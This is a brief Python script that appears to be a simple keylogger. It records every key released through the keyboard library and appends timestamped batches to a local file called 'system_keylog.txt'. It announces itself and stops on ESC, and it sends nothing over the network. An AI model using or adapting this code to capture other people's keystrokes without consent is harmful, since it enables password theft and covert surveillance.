import keyboard
from datetime import datetime

class logkey:
    def __init__(self, log_file="keylog.txt"):
        self.log_file = log_file
        self.log_buffer = []
        self.start_time = datetime.now()
        self.end_time = datetime.now()
        self.log = ""
    
    def callevent(self, event):
        name= event.name
        if len(name) > 1:
            name=f"[{name.upper()}]"
        self.log_buffer.append(name)
        if len(self.log_buffer) >= 10:
            self.savefile()
    def write_log(self, log_entry):
        with open(self.log_file, "a") as f:
            f.write(log_entry + "\n")
    
    def savefile(self):
        if not self.log_buffer:
            return 
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        with open(self.log_file, "a") as f:
            full_text = "".join(self.log_buffer)
            f.write(f"{timestamp} - {full_text}\n")
        self.log_buffer.clear()

    def start(self):
        print("Keylogger started... Press ESC to stop.")
        keyboard.on_release(self.callevent)
        keyboard.wait("esc")
        self.end_time = datetime.now()
        self.savefile()
        print(f"Keylogger stopped. Log saved to {self.log_file}")
if __name__ == "__main__":
    logger= logkey(log_file="system_keylog.txt")
    logger.start()


